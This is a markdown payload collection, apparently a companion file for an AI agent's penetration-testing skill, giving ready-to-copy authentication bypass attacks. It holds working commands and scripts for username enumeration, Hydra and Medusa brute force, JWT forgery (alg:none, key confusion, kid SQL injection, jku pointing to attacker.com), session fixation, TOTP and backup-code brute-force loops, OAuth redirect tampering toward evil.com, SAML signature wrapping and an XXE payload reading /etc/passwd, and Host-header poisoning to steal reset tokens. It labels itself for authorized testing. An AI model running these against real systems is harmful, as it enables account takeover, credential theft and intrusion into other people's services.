# Authentication Bypass Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for authentication bypass testing by attack type.
> Purpose: Quickly find request construction patterns for specific attack types, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Username Enumeration](#1-username-enumeration)
2. [Brute Force](#2-brute-force)
3. [JWT Attacks](#3-jwt-attacks)
4. [Session Management Attacks](#4-session-management-attacks)
5. [Cookie Security Attribute Testing](#5-cookie-security-attribute-testing)
6. [MFA Bypass](#6-mfa-bypass)
7. [OAuth Flow Attacks](#7-oauth-flow-attacks)
8. [Password Reset Attacks](#8-password-reset-attacks)

---

## 1. Username Enumeration

### Response Difference Enumeration

```bash
# Determine if a user exists based on error message differences
curl -s -d "user=admin&pass=wrong" http://target.com/login | grep -o "Incorrect password"
curl -s -d "user=nonexistent&pass=wrong" http://target.com/login | grep -o "User not found"

# Response time differences (existing users take longer for password hashing)
time curl -s -d "user=admin&pass=wrong" http://target.com/login
time curl -s -d "user=nonexistent&pass=wrong" http://target.com/login
```

### ffuf Batch Enumeration

```bash
# POST form enumeration
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
     -d "user=FUZZ&pass=test123" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.com/login -fr "User not found"

# JSON API enumeration
ffuf -w /usr/share/seclists/Usernames/names.txt \
     -H "Content-Type: application/json" \
     -d '{"username":"FUZZ","password":"test"}' \
     -u http://target.com/api/v1/auth/login -fr "user not found"
```

### Registration/Recovery Page Enumeration

```bash
# Registration page
curl -s -X POST http://target.com/register \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","email":"admin@test.com"}'
# "Username already taken" -> username exists

# Password recovery page
curl -s -X POST http://target.com/reset-password \
     -d '{"email":"admin@target.com"}'
# Different responses indicate whether the account exists
```

---

## 2. Brute Force

### Hydra -- HTTP POST

```bash
# Basic brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      target.com http-post-form \
      "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# Multi-threaded + specified port
hydra -L users.txt -P passwords.txt -t 10 -s 8080 \
      target.com http-post-form \
      "/auth/login:user=^USER^&pass=^PASS^:S=302"
```

### Medusa -- Parallel Multi-Protocol

```bash
# HTTP form
medusa -h target.com -U users.txt -P passwords.txt \
       -M http -m FORM:/login -m FORM-DATA:"POST:user=?&password=?"

# SSH
medusa -h target.com -U users.txt -P passwords.txt -M ssh
```

### ffuf -- API Brute Force

```bash
ffuf -w passwords.txt:FUZZ \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"FUZZ"}' \
     -u http://target.com/api/v1/auth/login -fc 401 -mc 200
```

---

## 3. JWT Attacks

> **Prerequisite**: jwt_tool requires manual installation (not included in Kali):
> `git clone https://github.com/ticarpi/jwt_tool.git && cd jwt_tool && pip3 install pycryptodomex termcolor cprint`

### alg:none Signature Bypass

```bash
# jwt_tool one-click attack
python3 jwt_tool.py <TOKEN> -X a

# Manual construction
header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
payload=$(echo -n '{"sub":"admin","role":"admin","iat":1700000000}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
echo "${header}.${payload}."
# Signature part is empty

# Variants: "None" / "NONE" / "nOnE"
```

### RS256 -> HS256 Algorithm Confusion

```bash
python3 jwt_tool.py <TOKEN> -X k -pk public_key.pem

# Obtain public key from JWKS URI
curl -s https://target.com/.well-known/jwks.json | jq '.keys[0]' > jwks.json
python3 jwt_tool.py <TOKEN> -X k -jw jwks.json
```

### Payload Tampering

```bash
# Modify sub field
python3 jwt_tool.py <TOKEN> -I -pc sub -pv admin
# Modify role field
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin
# Add new field
python3 jwt_tool.py <TOKEN> -I -pc is_admin -pv true
# Re-sign with known key
python3 jwt_tool.py <TOKEN> -I -pc sub -pv admin -S hs256 -p "secret_key"
```

### jku / x5u Header Injection

```bash
python3 jwt_tool.py <TOKEN> -X j -ju "https://attacker.com/jwks.json"
python3 jwt_tool.py <TOKEN> -X x -xu "https://attacker.com/cert.pem"
```

### JWT Key Brute Force

```bash
# Hashcat mode 16500 (HS256)
echo "<JWT_TOKEN>" > jwt_hash.txt
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# jwt_tool built-in dictionary
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/jwt-secrets.txt
```

---

## 4. Session Management Attacks

### Session ID Predictability Analysis

```bash
for i in $(seq 1 20); do
    curl -s -c - -d "user=test&pass=test" http://target.com/login 2>/dev/null | grep session
done
# Analysis: sequential? timestamp? base64(user:timestamp)? reversible?
```

### Session Fixation Attack

```bash
# Step 1: Obtain Session ID (without logging in)
curl -s -c cookies.txt http://target.com/login
FIXED_SESSION=$(grep session cookies.txt | awk '{print $NF}')

# Step 2: Induce victim to log in with this Session ID
curl -s -b "session=$FIXED_SESSION" http://target.com/login \
     -d "user=victim&pass=victimpass"

# Step 3: Attacker uses the same Session ID to access
curl -s -b "session=$FIXED_SESSION" http://target.com/admin/profile
```

### Session Concurrency Testing

```bash
# Multiple logins from same account -- check if old session is invalidated
curl -s -c session1.txt -d "user=test&pass=test" http://target.com/login
curl -s -c session2.txt -d "user=test&pass=test" http://target.com/login
curl -s -b session1.txt http://target.com/dashboard -o /dev/null -w "%{http_code}"
# 200 -> old session still valid
```

---

## 5. Cookie Security Attribute Testing

```bash
# Comprehensive Set-Cookie Header check
curl -sI http://target.com/login | while read line; do
    if echo "$line" | grep -qi "set-cookie"; then
        echo "$line"
        echo "$line" | grep -qi "httponly" || echo "  [!] Missing HttpOnly"
        echo "$line" | grep -qi "secure" || echo "  [!] Missing Secure"
        echo "$line" | grep -qi "samesite" || echo "  [!] Missing SameSite"
    fi
done
```

---

## 6. MFA Bypass

### Direct Access Bypass

```bash
curl -s -c cookies.txt -d "user=admin&pass=admin123" http://target.com/login
# Skip /mfa/verify and access directly
curl -s -b cookies.txt http://target.com/admin/dashboard -o /dev/null -w "%{http_code}"
# 200 -> MFA not enforced
```

### TOTP Brute Force

```bash
# 6-digit code, 30-second validity, enumerate when no rate limit
for code in $(seq 000000 999999); do
    resp=$(curl -s -d "code=$code" http://target.com/verify-mfa \
           -H "Cookie: session=$SESSION")
    echo "$resp" | grep -q "success" && echo "[+] Code: $code" && break
done
```

### Reset Flow Bypass

```bash
# MFA may be temporarily disabled after password reset
curl -s -X POST http://target.com/reset-password -d '{"email":"admin@target.com"}'
# Get reset link -> reset password -> log in directly -> check MFA status
```

---

## 7. OAuth Flow Attacks

### Redirect URI Validation Bypass

```bash
# Original callback
curl "https://target.com/auth/callback?code=XXX&redirect_uri=https://target.com/dashboard"

# Tamper redirect_uri
curl "https://target.com/auth/callback?code=XXX&redirect_uri=https://evil.com/steal"
curl "https://target.com/auth/callback?code=XXX&redirect_uri=https://target.com.evil.com"
curl "https://target.com/auth/callback?code=XXX&redirect_uri=https://target.com/@evil.com"
```

### state Parameter CSRF

```bash
# Missing state parameter -> CSRF attack can bind attacker's OAuth to victim's account
# Construct malicious link: /auth/callback?code=STOLEN_CODE&state=
```

---

## 8. Password Reset Attacks

### Token Predictability

```bash
# Request multiple tokens and analyze patterns
for i in $(seq 1 5); do
    curl -s -X POST http://target.com/reset-password -d '{"email":"test@test.com"}'
    sleep 1
done
# Check: base64 timestamp? sequential number? UUID v1? short numeric (brute-forceable)?
```

### Token Reuse Testing

```bash
# Step 1: Obtain token
curl -s -X POST http://target.com/reset-password -d '{"email":"test@test.com"}'

# Step 2: Use token to reset
curl -s -X POST http://target.com/reset-password/confirm \
     -d '{"token":"TOKEN_A","password":"NewPass123!"}'

# Step 3: Reuse the same token
curl -s -X POST http://target.com/reset-password/confirm \
     -d '{"token":"TOKEN_A","password":"AnotherPass456!"}'
# Success -> token not invalidated
```

### Account Binding Bypass

```bash
# Modify the email in the reset request
curl -s -X POST http://target.com/reset-password/confirm \
     -d '{"token":"TOKEN_A","email":"attacker@evil.com","password":"NewPass!"}'
# Password changed on a different account -> binding bypass
```

---

## 9. OAuth2 Token Manipulation

### redirect_uri Bypass Techniques

```bash
# Open redirect via subdomain/path manipulation
AUTHZ="https://target.com/oauth/authorize?client_id=CLIENT&response_type=code&scope=openid"

# Subdomain bypass
curl -sI "$AUTHZ&redirect_uri=https://evil.target.com/callback"
# Path traversal
curl -sI "$AUTHZ&redirect_uri=https://target.com/callback/../../../evil.com"
# Parameter pollution
curl -sI "$AUTHZ&redirect_uri=https://target.com/callback?next=https://evil.com"
# Fragment injection
curl -sI "$AUTHZ&redirect_uri=https://target.com/callback%23@evil.com"
# Encoded characters
curl -sI "$AUTHZ&redirect_uri=https://target.com%40evil.com/callback"
# Localhost bypass
curl -sI "$AUTHZ&redirect_uri=http://localhost/callback"
```

### OAuth Scope Escalation

```bash
# Request elevated scopes beyond what the app was granted
curl -s -X POST https://target.com/oauth/token \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "grant_type=authorization_code&code=AUTH_CODE&client_id=CLIENT&client_secret=SECRET&scope=admin+read+write+delete"

# Token exchange with scope upgrade
curl -s -X POST https://target.com/oauth/token \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "grant_type=refresh_token&refresh_token=REFRESH_TOKEN&scope=admin openid profile email"

# Test implicit grant scope manipulation
curl -sI "https://target.com/oauth/authorize?client_id=CLIENT&response_type=token&scope=admin+write+delete&redirect_uri=https://target.com/callback"
```

### OAuth Token Theft via Referrer Leakage

```bash
# Check if authorization code leaks via Referer header
# Step 1: Get auth code in URL
curl -sI "https://target.com/oauth/authorize?client_id=CLIENT&response_type=code&redirect_uri=https://target.com/callback" | grep -i "location"

# Step 2: Check if callback page has external resources that leak the code
curl -s "https://target.com/callback?code=AUTH_CODE" | grep -oP 'src="https?://[^"]*"'

# Step 3: Test if code can be reused (should be single-use)
curl -s -X POST https://target.com/oauth/token \
     -d "grant_type=authorization_code&code=USED_CODE&client_id=CLIENT&client_secret=SECRET"
```

### OAuth Client Impersonation

```bash
# Test if client_secret is validated
curl -s -X POST https://target.com/oauth/token \
     -d "grant_type=authorization_code&code=AUTH_CODE&client_id=CLIENT&client_secret=wrong_secret"

# Test client_credentials grant without proper validation
curl -s -X POST https://target.com/oauth/token \
     -d "grant_type=client_credentials&client_id=CLIENT&client_secret=SECRET&scope=admin"

# PKCE bypass (test if code_verifier is actually validated)
curl -s -X POST https://target.com/oauth/token \
     -d "grant_type=authorization_code&code=AUTH_CODE&client_id=PUBLIC_CLIENT&code_verifier=arbitrary_string"
```

---

## 10. SAML Assertion Attacks

### SAML Signature Wrapping (XSW)

```bash
# Use SAML Raider (Burp extension) or manual XML manipulation
# XSW Attack: Move signed assertion and inject unsigned malicious one

python3 -c "
import base64
from lxml import etree

# Decode SAML Response
saml_b64 = 'BASE64_SAML_RESPONSE'
saml_xml = base64.b64decode(saml_b64)
tree = etree.fromstring(saml_xml)

ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
      'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol'}

# Clone the signed assertion
assertion = tree.find('.//saml:Assertion', ns)
cloned = etree.fromstring(etree.tostring(assertion))

# Modify the cloned assertion (change NameID to admin)
nameid = cloned.find('.//saml:NameID', ns)
nameid.text = 'admin@target.com'

# XSW1: Insert cloned assertion before the original
tree.insert(0, cloned)

# Re-encode
modified = base64.b64encode(etree.tostring(tree)).decode()
print(modified)
"
```

### SAML Assertion Replay

```bash
# Capture and replay a valid SAML assertion
# Step 1: Extract SAML Response from POST
curl -s -X POST https://target.com/saml/acs \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "SAMLResponse=CAPTURED_BASE64_RESPONSE&RelayState=/"

# Step 2: Replay after session expiry (test NotOnOrAfter enforcement)
sleep 600  # Wait past assertion validity window
curl -s -X POST https://target.com/saml/acs \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "SAMLResponse=CAPTURED_BASE64_RESPONSE&RelayState=/"
# If 200 -> assertion replay not prevented
```

### SAML NameID Manipulation

```python
#!/usr/bin/env python3
"""Manipulate SAML NameID to escalate privileges."""
import base64
from lxml import etree

def modify_saml_nameid(saml_response_b64, new_nameid):
    saml_xml = base64.b64decode(saml_response_b64)
    tree = etree.fromstring(saml_xml)
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}

    # Remove signature (test if SP validates)
    for sig in tree.findall('.//{http://www.w3.org/2000/09/xmldsig#}Signature'):
        sig.getparent().remove(sig)

    # Change NameID
    nameid = tree.find('.//saml:NameID', ns)
    if nameid is not None:
        nameid.text = new_nameid

    # Change attributes
    for attr in tree.findall('.//saml:Attribute[@Name="Role"]/saml:AttributeValue', ns):
        attr.text = "admin"

    return base64.b64encode(etree.tostring(tree)).decode()

# Usage
modified = modify_saml_nameid("ORIGINAL_B64", "admin@target.com")
print(f"Modified SAML Response: {modified[:80]}...")
```

### SAML XML External Entity (XXE)

```bash
# Inject XXE payload into SAML assertion
python3 -c "
import base64

xxe_saml = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">
]>
<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">
  <saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>'''

encoded = base64.b64encode(xxe_saml.encode()).decode()
print(encoded)
" | xargs -I{} curl -s -X POST https://target.com/saml/acs \
     -d "SAMLResponse={}&RelayState=/"
```

---

## 11. JWT Algorithm Confusion

### none Algorithm Attack Variants

```bash
# Test all case variations of "none" algorithm
for alg in none None NONE nOnE noNe NoNe; do
  header=$(echo -n "{\"alg\":\"$alg\",\"typ\":\"JWT\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  payload=$(echo -n '{"sub":"admin","role":"admin","iat":1700000000,"exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
  token="${header}.${payload}."
  resp=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $token" \
    https://target.com/api/v1/admin/users)
  echo "alg=$alg -> HTTP $resp"
done
```

### RS256/HS256 Key Confusion Attack

```bash
# Step 1: Obtain the public key
curl -s https://target.com/.well-known/jwks.json > jwks.json
# Or extract from certificate
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
  openssl x509 -pubkey -noout > public_key.pem

# Step 2: Sign token with public key using HS256
python3 -c "
import jwt
import json

with open('public_key.pem', 'r') as f:
    public_key = f.read()

payload = {
    'sub': 'admin',
    'role': 'admin',
    'iat': 1700000000,
    'exp': 9999999999
}

# Sign with HS256 using the RSA public key as the HMAC secret
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
"
```

### kid (Key ID) Header Injection

```bash
# kid path traversal to use a known file as signing key
python3 -c "
import jwt, base64

# Use /dev/null as key (empty key)
token = jwt.encode(
    {'sub': 'admin', 'role': 'admin'},
    '',
    algorithm='HS256',
    headers={'kid': '../../dev/null'}
)
print(f'Null key: {token}')

# Use a predictable file as key
token2 = jwt.encode(
    {'sub': 'admin', 'role': 'admin'},
    'static content of known file',
    algorithm='HS256',
    headers={'kid': '../../public/css/style.css'}
)
print(f'Known file key: {token2}')
"

# kid SQL injection
python3 -c "
import jwt
token = jwt.encode(
    {'sub': 'admin', 'role': 'admin'},
    'key',
    algorithm='HS256',
    headers={'kid': \"' UNION SELECT 'known-secret' -- \"}
)
print(token)
"
```

### jwk/jku Header Injection

```bash
# Step 1: Generate attacker's RSA key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Step 2: Create JWKS endpoint on attacker server
python3 -c "
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import base64

with open('attacker_public.pem', 'rb') as f:
    pub_key = serialization.load_pem_public_key(f.read(), backend=default_backend())

numbers = pub_key.public_numbers()
jwks = {'keys': [{
    'kty': 'RSA',
    'kid': 'attacker-key-1',
    'use': 'sig',
    'n': base64.urlsafe_b64encode(numbers.n.to_bytes(256, 'big')).decode().rstrip('='),
    'e': base64.urlsafe_b64encode(numbers.e.to_bytes(3, 'big')).decode().rstrip('=')
}]}
print(json.dumps(jwks, indent=2))
" > jwks.json
# Host jwks.json on attacker server

# Step 3: Create JWT with jku pointing to attacker's JWKS
python3 -c "
import jwt
token = jwt.encode(
    {'sub': 'admin', 'role': 'admin'},
    open('attacker_private.pem').read(),
    algorithm='RS256',
    headers={'jku': 'https://attacker.com/.well-known/jwks.json', 'kid': 'attacker-key-1'}
)
print(token)
"
```

---

## 12. Password Reset Flow Abuse

### Token Prediction and Brute Force

```bash
# Collect multiple reset tokens to analyze patterns
for i in $(seq 1 10); do
  curl -s -X POST http://target.com/api/v1/reset-password \
       -H "Content-Type: application/json" \
       -d '{"email":"test@test.com"}' &
done
wait

# Analyze token patterns (check for sequential, timestamp-based, or short tokens)
# If tokens are 6-digit numeric:
seq 000000 999999 | while read code; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://target.com/reset-password/verify?token=$code&email=admin@target.com")
  [ "$resp" = "200" ] && echo "[+] Valid token: $code" && break
done
```

### Race Condition in Password Reset

```bash
# Send multiple reset requests simultaneously to get predictable tokens
# or to reset another user's password
python3 -c "
import requests
import threading

url = 'http://target.com/api/v1/reset-password'
results = []

def send_reset(email):
    r = requests.post(url, json={'email': email})
    results.append({'email': email, 'status': r.status_code, 'body': r.text})

# Race: request reset for victim while requesting for attacker
threads = []
for _ in range(10):
    threads.append(threading.Thread(target=send_reset, args=('victim@target.com',)))
    threads.append(threading.Thread(target=send_reset, args=('attacker@evil.com',)))

for t in threads:
    t.start()
for t in threads:
    t.join()

for r in results:
    print(f\"{r['email']}: {r['status']}\")
"
```

### Host Header Poisoning in Reset Emails

```bash
# Inject attacker's domain via Host header to steal reset tokens
curl -s -X POST http://target.com/api/v1/reset-password \
     -H "Host: evil.com" \
     -H "Content-Type: application/json" \
     -d '{"email":"victim@target.com"}'
# Reset email may contain: https://evil.com/reset?token=SECRET_TOKEN

# X-Forwarded-Host variant
curl -s -X POST http://target.com/api/v1/reset-password \
     -H "X-Forwarded-Host: evil.com" \
     -H "Content-Type: application/json" \
     -d '{"email":"victim@target.com"}'
```

### Password Reset Token Leakage

```bash
# Check if reset token appears in response body
curl -s -X POST http://target.com/api/v1/reset-password \
     -H "Content-Type: application/json" \
     -d '{"email":"test@test.com"}' | jq '.token // .reset_url // .data'

# Check if token leaks in HTTP headers
curl -sI -X POST http://target.com/api/v1/reset-password \
     -H "Content-Type: application/json" \
     -d '{"email":"test@test.com"}' | grep -i "token\|reset\|location"

# Check Referrer leakage from reset page
curl -s "http://target.com/reset-password?token=SECRET" | \
  grep -oP 'src="https?://[^"]*"|href="https?://[^"]*"' | grep -v "target.com"
```

---

## 13. MFA Bypass Techniques

### Response Manipulation Bypass

```bash
# Intercept and modify MFA verification response
# Step 1: Submit wrong MFA code and capture response
curl -s -X POST http://target.com/api/v1/mfa/verify \
     -H "Cookie: session=SESSION_ID" \
     -H "Content-Type: application/json" \
     -d '{"code":"000000"}' -v 2>&1

# Step 2: If response is {"success": false}, try replaying with modified response
# Use Burp/mitmproxy to change response to {"success": true}

# Step 3: Test if server trusts client-side MFA state
curl -s http://target.com/api/v1/dashboard \
     -H "Cookie: session=SESSION_ID" \
     -H "X-MFA-Verified: true"

# Step 4: Test if MFA can be skipped by directly accessing post-MFA endpoints
curl -s http://target.com/api/v1/admin/settings \
     -H "Cookie: session=SESSION_ID" \
     -o /dev/null -w "%{http_code}"
```

### Backup Code Brute Force

```bash
# Backup codes are typically 8-character alphanumeric
# If no rate limiting, brute force is feasible for short codes
python3 -c "
import requests
import itertools
import string

session = requests.Session()
session.cookies.set('session', 'SESSION_ID')

# If backup codes are 6-digit numeric
for code in range(100000, 999999):
    r = session.post('http://target.com/api/v1/mfa/verify', json={
        'type': 'backup_code',
        'code': str(code)
    })
    if r.status_code == 200 and 'success' in r.text:
        print(f'[+] Valid backup code: {code}')
        break
    if code % 1000 == 0:
        print(f'Tried {code}...')
"
```

### MFA Enrollment Bypass

```bash
# Test if MFA can be disabled without current MFA verification
curl -s -X DELETE http://target.com/api/v1/mfa \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json"

# Test if MFA setup can be re-initiated (overwrite existing MFA)
curl -s -X POST http://target.com/api/v1/mfa/setup \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"type":"totp"}'

# Test if MFA is enforced on all authentication paths
curl -s -X POST http://target.com/api/v1/auth/token \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"password","grant_type":"password"}'
# API token grant may bypass MFA
```

### MFA Timing and Race Conditions

```bash
# Race condition: use MFA code simultaneously in multiple sessions
python3 -c "
import requests
import threading

valid_code = '123456'  # Known valid TOTP code
url = 'http://target.com/api/v1/mfa/verify'
results = []

def verify_mfa(session_id):
    r = requests.post(url, json={'code': valid_code},
                      cookies={'session': session_id})
    results.append({'session': session_id, 'status': r.status_code})

# Create multiple sessions for the same user
sessions = ['session_1', 'session_2', 'session_3', 'session_4', 'session_5']
threads = [threading.Thread(target=verify_mfa, args=(s,)) for s in sessions]
for t in threads:
    t.start()
for t in threads:
    t.join()

# If multiple sessions succeed, MFA code reuse is possible
for r in results:
    print(f\"{r['session']}: {r['status']}\")
"
```

### MFA via Alternative Channel Bypass

```bash
# Test if SMS MFA code is accepted on email MFA endpoint and vice versa
curl -s -X POST http://target.com/api/v1/mfa/verify \
     -H "Cookie: session=SESSION_ID" \
     -H "Content-Type: application/json" \
     -d '{"code":"123456","type":"sms"}'

# Test if MFA is enforced on password change (should require re-auth)
curl -s -X POST http://target.com/api/v1/account/change-password \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"current_password":"old","new_password":"new"}'

# Test if API keys bypass MFA requirement
curl -s http://target.com/api/v1/admin/users \
     -H "X-API-Key: VALID_API_KEY"
```
